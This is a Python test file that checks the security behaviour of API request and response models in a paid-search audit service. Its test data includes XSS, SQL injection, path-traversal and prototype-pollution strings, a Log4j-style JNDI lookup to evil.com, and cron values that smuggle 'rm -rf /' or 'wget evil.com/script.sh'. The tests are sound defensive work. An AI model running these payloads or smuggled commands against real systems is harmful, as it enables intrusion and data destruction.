"""Tests for API request/response models security and validation."""

from datetime import datetime

import pytest
from pydantic import ValidationError

from paidsearchnav_mcp.api.models.requests import (
    AuditFilters,
    CreateAuditRequest,
    CreateScheduleRequest,
    GenerateReportRequest,
    GoogleAuthCallback,
    GoogleAuthRequest,
    PaginationParams,
)
from paidsearchnav_mcp.api.models.responses import (
    AuthTokenResponse,
    CustomerResponse,
    ErrorResponse,
    PaginatedResponse,
    WebSocketMessage,
)


class TestRequestModelsSecurity:
    """Test security aspects of request models."""

    class TestGoogleAuthRequest:
        """Test GoogleAuthRequest model security."""

        def test_valid_redirect_uri(self):
            """Test valid redirect URI."""
            request = GoogleAuthRequest(
                redirect_uri="https://localhost:3000/callback",
                state="test-state",
            )
            assert request.redirect_uri == "https://localhost:3000/callback"
            assert request.state == "test-state"

        def test_missing_redirect_uri(self):
            """Test that redirect_uri is required."""
            with pytest.raises(ValidationError) as exc_info:
                GoogleAuthRequest(state="test-state")

            assert "redirect_uri" in str(exc_info.value)

        def test_optional_state(self):
            """Test that state is optional."""
            request = GoogleAuthRequest(redirect_uri="https://localhost:3000/callback")
            assert request.redirect_uri == "https://localhost:3000/callback"
            assert request.state is None

        def test_malicious_redirect_uri_accepted(self):
            """Test that malicious redirect URIs are currently accepted."""
            malicious_uris = [
                "javascript:alert('xss')",
                "data:text/html,<script>alert('xss')</script>",
                "ftp://malicious.com/callback",
                "http://evil.com/callback",
            ]

            for uri in malicious_uris:
                # Currently accepts any string - PRODUCTION TODO: Add URL validation
                # Consider validating against allowed domains and schemes (https only)
                request = GoogleAuthRequest(redirect_uri=uri)
                assert request.redirect_uri == uri

        def test_very_long_redirect_uri(self):
            """Test handling of very long redirect URIs."""
            long_uri = "https://example.com/" + "a" * 10000
            request = GoogleAuthRequest(redirect_uri=long_uri)
            assert request.redirect_uri == long_uri

        def test_special_characters_in_state(self):
            """Test handling of special characters in state."""
            special_states = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "state\nwith\nnewlines",
                "🚨💀🔥",  # Emoji
                "state with spaces",
            ]

            for state in special_states:
                request = GoogleAuthRequest(
                    redirect_uri="https://localhost:3000/callback",
                    state=state,
                )
                assert request.state == state

    class TestGoogleAuthCallback:
        """Test GoogleAuthCallback model security."""

        def test_valid_callback(self):
            """Test valid callback data."""
            callback = GoogleAuthCallback(
                code="auth-code-123",
                state="test-state",
                redirect_uri="https://localhost:3000/callback",
            )
            assert callback.code == "auth-code-123"
            assert callback.state == "test-state"
            assert callback.redirect_uri == "https://localhost:3000/callback"

        def test_missing_code(self):
            """Test that code is required."""
            with pytest.raises(ValidationError) as exc_info:
                GoogleAuthCallback(
                    state="test-state",
                    redirect_uri="https://localhost:3000/callback",
                )

            assert "code" in str(exc_info.value)

        def test_missing_redirect_uri(self):
            """Test that redirect_uri is required."""
            with pytest.raises(ValidationError) as exc_info:
                GoogleAuthCallback(code="auth-code-123", state="test-state")

            assert "redirect_uri" in str(exc_info.value)

        def test_malicious_code_injection(self):
            """Test handling of malicious code values."""
            malicious_codes = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE oauth_tokens; --",
                "code\nwith\nnewlines",
                "code" + "a" * 10000,  # Very long code
            ]

            for code in malicious_codes:
                callback = GoogleAuthCallback(
                    code=code,
                    state="test-state",
                    redirect_uri="https://localhost:3000/callback",
                )
                assert callback.code == code

    class TestCreateAuditRequest:
        """Test CreateAuditRequest model security."""

        def test_valid_customer_id_with_hyphens(self):
            """Test valid customer ID with hyphens."""
            request = CreateAuditRequest(customer_id="123-456-7890")
            assert request.customer_id == "1234567890"  # Hyphens removed

        def test_valid_customer_id_without_hyphens(self):
            """Test valid customer ID without hyphens."""
            request = CreateAuditRequest(customer_id="1234567890")
            assert request.customer_id == "1234567890"

        def test_invalid_customer_id_wrong_length(self):
            """Test invalid customer ID with wrong length."""
            invalid_ids = [
                "123456789",  # Too short
                "12345678901",  # Too long
                "123456",  # Much too short
            ]

            for customer_id in invalid_ids:
                with pytest.raises(ValidationError) as exc_info:
                    CreateAuditRequest(customer_id=customer_id)

                assert "Customer ID must be 10 digits" in str(exc_info.value)

        def test_invalid_customer_id_non_numeric(self):
            """Test invalid customer ID with non-numeric characters."""
            invalid_ids = [
                "123456789a",
                "abc1234567",
                "123-456-78a0",
                "1234567890!",
                "12345 67890",  # Space
            ]

            for customer_id in invalid_ids:
                with pytest.raises(ValidationError) as exc_info:
                    CreateAuditRequest(customer_id=customer_id)

                assert "Customer ID must be 10 digits" in str(exc_info.value)

        def test_sql_injection_in_customer_id(self):
            """Test SQL injection attempts in customer ID."""
            sql_injections = [
                "1234567890'; DROP TABLE audits; --",
                "1234567890 OR 1=1",
                "1234567890; DELETE FROM customers",
            ]

            for customer_id in sql_injections:
                with pytest.raises(ValidationError) as exc_info:
                    CreateAuditRequest(customer_id=customer_id)

                assert "Customer ID must be 10 digits" in str(exc_info.value)

        def test_xss_in_name_field(self):
            """Test XSS attempts in name field."""
            xss_names = [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert('xss')>",
                "javascript:alert('xss')",
                "<svg onload=alert('xss')>",
            ]

            for name in xss_names:
                # Should accept XSS (output encoding should handle it)
                request = CreateAuditRequest(
                    customer_id="1234567890",
                    name=name,
                )
                assert request.name == name

        def test_very_long_name(self):
            """Test handling of very long name."""
            long_name = "Audit Name " + "a" * 10000
            request = CreateAuditRequest(
                customer_id="1234567890",
                name=long_name,
            )
            assert request.name == long_name

        def test_analyzers_list_validation(self):
            """Test analyzers list validation."""
            request = CreateAuditRequest(
                customer_id="1234567890",
                analyzers=["keyword_match", "search_terms"],
            )
            assert request.analyzers == ["keyword_match", "search_terms"]

        def test_malicious_analyzers(self):
            """Test malicious analyzer names."""
            malicious_analyzers = [
                ["<script>alert('xss')</script>"],
                ["'; DROP TABLE analyzers; --"],
                ["../../../etc/passwd"],
                ["analyzer" + "a" * 10000],  # Very long name
            ]

            for analyzers in malicious_analyzers:
                # Should accept malicious names (validation happens elsewhere)
                request = CreateAuditRequest(
                    customer_id="1234567890",
                    analyzers=analyzers,
                )
                assert request.analyzers == analyzers

        def test_config_dict_injection(self):
            """Test config dictionary injection attacks."""
            malicious_configs = [
                {"__proto__": {"admin": True}},  # Prototype pollution
                {"eval": "require('child_process').exec('rm -rf /')"},
                {"constructor": {"prototype": {"admin": True}}},
            ]

            for config in malicious_configs:
                # Should accept malicious config (handling happens elsewhere)
                request = CreateAuditRequest(
                    customer_id="1234567890",
                    config=config,
                )
                assert request.config == config

    class TestCreateScheduleRequest:
        """Test CreateScheduleRequest model security."""

        def test_customer_id_validation_same_as_audit(self):
            """Test that customer ID validation is same as CreateAuditRequest."""
            # Valid ID
            request = CreateScheduleRequest(
                customer_id="123-456-7890",
                name="Test Schedule",
                cron_expression="0 0 1 * *",
            )
            assert request.customer_id == "1234567890"

            # Invalid ID
            with pytest.raises(ValidationError) as exc_info:
                CreateScheduleRequest(
                    customer_id="invalid",
                    name="Test Schedule",
                    cron_expression="0 0 1 * *",
                )

            assert "Customer ID must be 10 digits" in str(exc_info.value)

        def test_customer_id_optional(self):
            """Test that customer_id is optional in schedule requests."""
            request = CreateScheduleRequest(
                name="Test Schedule",
                cron_expression="0 0 1 * *",
            )
            assert request.customer_id is None

        def test_cron_expression_injection(self):
            """Test cron expression injection attempts."""
            malicious_crons = [
                "0 0 1 * *; rm -rf /",
                "0 0 1 * * && wget evil.com/script.sh",
                "$(wget evil.com/script.sh)",
                "`rm -rf /`",
            ]

            for cron in malicious_crons:
                # Should accept malicious cron (validation happens elsewhere)
                request = CreateScheduleRequest(
                    name="Test Schedule",
                    cron_expression=cron,
                )
                assert request.cron_expression == cron

    class TestGenerateReportRequest:
        """Test GenerateReportRequest model security."""

        def test_format_validation(self):
            """Test report format validation."""
            valid_formats = ["html", "pdf", "excel", "csv"]

            for fmt in valid_formats:
                request = GenerateReportRequest(format=fmt)
                assert request.format == fmt.lower()

        def test_format_case_insensitive(self):
            """Test that format validation is case insensitive."""
            request = GenerateReportRequest(format="HTML")
            assert request.format == "html"

        def test_invalid_format(self):
            """Test invalid report format."""
            invalid_formats = [
                "xml",
                "json",
                "binary",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
            ]

            for fmt in invalid_formats:
                with pytest.raises(ValidationError) as exc_info:
                    GenerateReportRequest(format=fmt)

                assert "Format must be one of:" in str(exc_info.value)

        def test_template_injection(self):
            """Test template injection attempts."""
            malicious_templates = [
                "{{7*7}}",  # Template injection
                "${jndi:ldap://evil.com/a}",  # Log4j style
                "#{7*7}",  # Expression Language injection
                "<%= system('rm -rf /') %>",  # ERB injection
            ]

            for template in malicious_templates:
                # Should accept malicious templates (handling happens elsewhere)
                request = GenerateReportRequest(template=template)
                assert request.template == template

        def test_include_sections_list(self):
            """Test include_sections list handling."""
            request = GenerateReportRequest(
                include_sections=["summary", "recommendations", "charts"]
            )
            assert request.include_sections == ["summary", "recommendations", "charts"]

        def test_malicious_include_sections(self):
            """Test malicious include_sections values."""
            malicious_sections = [
                ["<script>alert('xss')</script>"],
                ["../../../etc/passwd"],
                ["'; DROP TABLE reports; --"],
            ]

            for sections in malicious_sections:
                # Should accept malicious sections (handling happens elsewhere)
                request = GenerateReportRequest(include_sections=sections)
                assert request.include_sections == sections

    class TestPaginationParams:
        """Test PaginationParams model security."""

        def test_valid_pagination(self):
            """Test valid pagination parameters."""
            params = PaginationParams(page=1, per_page=20)
            assert params.page == 1
            assert params.per_page == 20
            assert params.offset == 0

        def test_offset_calculation(self):
            """Test offset calculation."""
            params = PaginationParams(page=3, per_page=10)
            assert params.offset == 20  # (3-1) * 10

        def test_page_minimum_validation(self):
            """Test page minimum value validation."""
            with pytest.raises(ValidationError) as exc_info:
                PaginationParams(page=0)

            assert "greater than or equal to 1" in str(exc_info.value)

            with pytest.raises(ValidationError) as exc_info:
                PaginationParams(page=-1)

            assert "greater than or equal to 1" in str(exc_info.value)

        def test_per_page_validation(self):
            """Test per_page validation."""
            # Minimum value
            with pytest.raises(ValidationError) as exc_info:
                PaginationParams(per_page=0)

            assert "greater than or equal to 1" in str(exc_info.value)

            # Maximum value
            with pytest.raises(ValidationError) as exc_info:
                PaginationParams(per_page=101)

            assert "less than or equal to 100" in str(exc_info.value)

        def test_large_page_numbers(self):
            """Test handling of very large page numbers."""
            # Should handle large page numbers (may cause large offsets)
            params = PaginationParams(page=1000000, per_page=100)
            assert params.page == 1000000
            assert params.offset == 99999900  # Very large offset

        def test_pagination_defaults(self):
            """Test default pagination values."""
            params = PaginationParams()
            assert params.page == 1
            assert params.per_page == 20
            assert params.offset == 0

    class TestAuditFilters:
        """Test AuditFilters model security."""

        def test_valid_filters(self):
            """Test valid audit filters."""
            now = datetime.utcnow()
            filters = AuditFilters(
                customer_id="1234567890",
                status="completed",
                created_after=now,
                created_before=now,
            )
            assert filters.customer_id == "1234567890"
            assert filters.status == "completed"

        def test_sql_injection_in_filters(self):
            """Test SQL injection attempts in filter fields."""
            sql_injections = [
                "'; DROP TABLE audits; --",
                "1' OR '1'='1",
                "completed' UNION SELECT * FROM users --",
            ]

            for injection in sql_injections:
                # Should accept SQL injection strings (prevention happens at DB layer)
                filters = AuditFilters(
                    customer_id=injection,
                    status=injection,
                )
                assert filters.customer_id == injection
                assert filters.status == injection

        def test_xss_in_filters(self):
            """Test XSS attempts in filter fields."""
            xss_payloads = [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert('xss')>",
                "javascript:alert('xss')",
            ]

            for payload in xss_payloads:
                # Should accept XSS payloads (prevention happens at output layer)
                filters = AuditFilters(
                    customer_id=payload,
                    status=payload,
                )
                assert filters.customer_id == payload
                assert filters.status == payload

        def test_date_range_logic_bomb(self):
            """Test date range that could cause performance issues."""
            very_old_date = datetime(1900, 1, 1)
            very_future_date = datetime(2100, 12, 31)

            # Should accept very wide date ranges
            filters = AuditFilters(
                created_after=very_old_date,
                created_before=very_future_date,
            )
            assert filters.created_after == very_old_date
            assert filters.created_before == very_future_date


class TestResponseModelsSecurity:
    """Test security aspects of response models."""

    class TestErrorResponse:
        """Test ErrorResponse model security."""

        def test_error_response_creation(self):
            """Test error response creation."""
            error = ErrorResponse(
                detail="An error occurred",
                code="ERR001",
                field="customer_id",
            )
            assert error.detail == "An error occurred"
            assert error.code == "ERR001"
            assert error.field == "customer_id"

        def test_error_response_with_sensitive_data(self):
            """Test error response that might contain sensitive data."""
            # In production, ensure sensitive data is not leaked in error messages
            sensitive_details = [
                "Database connection failed with password: secret123",
                "JWT secret key validation failed: test-secret-key",
                "SQL error: SELECT * FROM users WHERE password='hash'",
            ]

            for detail in sensitive_details:
                error = ErrorResponse(detail=detail)
                assert error.detail == detail  # Currently accepts any detail

        def test_error_response_xss_potential(self):
            """Test error response with potential XSS content."""
            xss_details = [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert('xss')>",
                "Error: <svg onload=alert('xss')>",
            ]

            for detail in xss_details:
                error = ErrorResponse(detail=detail)
                assert error.detail == detail  # XSS prevention should happen at output

    class TestAuthTokenResponse:
        """Test AuthTokenResponse model security."""

        def test_auth_token_response(self):
            """Test auth token response creation."""
            response = AuthTokenResponse(
                access_token="jwt.token.here",
                token_type="bearer",
                expires_in=3600,
            )
            assert response.access_token == "jwt.token.here"
            assert response.token_type == "bearer"
            assert response.expires_in == 3600

        def test_auth_token_exposure_in_logs(self):
            """Test that token response doesn't expose sensitive data in repr."""
            response = AuthTokenResponse(access_token="sensitive.jwt.token")

            # Check that token is not exposed in string representation
            response_str = str(response)
            # Pydantic models may expose data in string representation
            # In production, consider custom __str__ method for security

        def test_token_type_validation(self):
            """Test token type field."""
            response = AuthTokenResponse(access_token="token")
            assert response.token_type == "bearer"  # Default value

        def test_very_long_token(self):
            """Test handling of very long tokens."""
            long_token = "jwt." + "a" * 10000 + ".signature"
            response = AuthTokenResponse(access_token=long_token)
            assert response.access_token == long_token

    class TestCustomerResponse:
        """Test CustomerResponse model security."""

        def test_customer_response_creation(self):
            """Test customer response creation."""
            now = datetime.utcnow()
            response = CustomerResponse(
                id="cust-123",
                name="Test Customer",
                email="test@example.com",
                created_at=now,
                updated_at=now,
            )
            assert response.id == "cust-123"
            assert response.name == "Test Customer"
            assert response.email == "test@example.com"

        def test_customer_data_sanitization(self):
            """Test that customer data might need sanitization."""
            xss_data = "<script>alert('xss')</script>"
            sql_data = "'; DROP TABLE customers; --"

            # Should accept any data (sanitization happens at output/storage)
            response = CustomerResponse(
                id="cust-123",
                name=xss_data,
                email=sql_data,
                created_at=datetime.utcnow(),
                updated_at=datetime.utcnow(),
            )
            assert response.name == xss_data
            assert response.email == sql_data

        def test_settings_dict_security(self):
            """Test settings dictionary security."""
            malicious_settings = {
                "__proto__": {"admin": True},
                "constructor": {"prototype": {"admin": True}},
                "password": "secret123",  # Sensitive data
            }

            response = CustomerResponse(
                id="cust-123",
                name="Test Customer",
                created_at=datetime.utcnow(),
                updated_at=datetime.utcnow(),
                settings=malicious_settings,
            )
            assert response.settings == malicious_settings

    class TestPaginatedResponse:
        """Test PaginatedResponse model security."""

        def test_paginated_response_creation(self):
            """Test paginated response creation."""
            items = [{"id": 1}, {"id": 2}]
            response = PaginatedResponse.create(
                items=items,
                total=100,
                page=1,
                per_page=20,
            )
            assert response.items == items
            assert response.total == 100
            assert response.page == 1
            assert response.per_page == 20
            assert response.pages == 5

        def test_pages_calculation_overflow(self):
            """Test pages calculation with large numbers."""
            # Test potential integer overflow scenarios
            large_total = 2**31 - 1  # Max 32-bit signed int
            large_per_page = 1

            response = PaginatedResponse.create(
                items=[],
                total=large_total,
                page=1,
                per_page=large_per_page,
            )
            # Should handle large numbers correctly
            assert response.pages == large_total

        def test_zero_per_page_division(self):
            """Test handling of zero per_page (division by zero)."""
            # This should be prevented at validation level
            # but testing the calculation logic
            try:
                response = PaginatedResponse.create(
                    items=[],
                    total=100,
                    page=1,
                    per_page=0,  # Would cause division by zero
                )
                # If it doesn't fail, check the result
                assert response.pages >= 0
            except ZeroDivisionError:
                # Expected behavior for division by zero
                pass

        def test_negative_values(self):
            """Test handling of negative values."""
            # Should handle negative values gracefully
            response = PaginatedResponse.create(
                items=[],
                total=-100,  # Negative total
                page=-1,  # Negative page
                per_page=20,
            )
            # Mathematical result might be negative
            assert isinstance(response.pages, int)

    class TestWebSocketMessage:
        """Test WebSocketMessage model security."""

        def test_websocket_message_creation(self):
            """Test WebSocket message creation."""
            message = WebSocketMessage(
                type="audit_update",
                data={"status": "completed", "progress": 100},
            )
            assert message.type == "audit_update"
            assert message.data["status"] == "completed"

        def test_websocket_message_xss_injection(self):
            """Test WebSocket message with XSS content."""
            xss_data = {
                "message": "<script>alert('xss')</script>",
                "user": "<img src=x onerror=alert('xss')>",
            }

            message = WebSocketMessage(
                type="user_message",
                data=xss_data,
            )
            assert (
                message.data == xss_data
            )  # Should accept XSS (client should sanitize)

        def test_websocket_message_prototype_pollution(self):
            """Test WebSocket message with prototype pollution attempt."""
            pollution_data = {
                "__proto__": {"admin": True},
                "constructor": {"prototype": {"admin": True}},
            }

            message = WebSocketMessage(
                type="config_update",
                data=pollution_data,
            )
            assert message.data == pollution_data

        def test_websocket_message_very_large_data(self):
            """Test WebSocket message with very large data."""
            large_data = {"payload": "a" * 1000000}  # 1MB of data

            message = WebSocketMessage(
                type="large_update",
                data=large_data,
            )
            assert message.data == large_data

        def test_websocket_message_default_timestamp(self):
            """Test WebSocket message default timestamp."""
            before = datetime.utcnow()
            message = WebSocketMessage(
                type="test",
                data={},
            )
            after = datetime.utcnow()

            # Timestamp should be set automatically
            assert before <= message.timestamp <= after


class TestModelDataLeakage:
    """Test for potential data leakage in models."""

    def test_model_dict_serialization(self):
        """Test that model serialization doesn't leak sensitive data."""
        # Create a customer response with potentially sensitive data
        customer = CustomerResponse(
            id="cust-123",
            name="Test Customer",
            email="test@example.com",
            created_at=datetime.utcnow(),
            updated_at=datetime.utcnow(),
            settings={"api_key": "secret-key-123", "password_hash": "hash123"},
        )

        # Convert to dict (what would be serialized)
        customer_dict = customer.model_dump()

        # Check that sensitive data is included (might need custom serialization)
        assert "api_key" in customer_dict["settings"]
        # In production, consider custom serialization to exclude sensitive fields

    def test_model_json_serialization(self):
        """Test JSON serialization of models."""
        auth_response = AuthTokenResponse(
            access_token="sensitive.jwt.token",
            expires_in=3600,
        )

        # JSON serialization includes all fields
        json_str = auth_response.model_dump_json()
        assert "sensitive.jwt.token" in json_str
        # This is expected for auth tokens, but be careful with other sensitive data

    def test_error_response_information_disclosure(self):
        """Test that error responses don't disclose too much information."""
        # Simulate various error scenarios
        error_scenarios = [
            "User 'admin' not found in database table 'users'",
            "Database connection failed: SQLSTATE[28000] [1045] Access denied for user 'root'@'localhost' (using password: YES)",
            "File not found: /etc/passwd",
            "Invalid JWT signature using key: test-secret-key-123",
        ]

        for detail in error_scenarios:
            error = ErrorResponse(detail=detail)
            # Currently accepts detailed error messages
            # In production, consider sanitizing error messages
            assert error.detail == detail

    def test_model_validation_error_information(self):
        """Test that validation errors don't leak sensitive information."""
        try:
            # Trigger validation error with sensitive data
            CreateAuditRequest(customer_id="secret-api-key-123")
        except ValidationError as e:
            error_str = str(e)
            # Validation error includes the input value
            assert "secret-api-key-123" in error_str
            # In production, consider custom error messages for sensitive fields
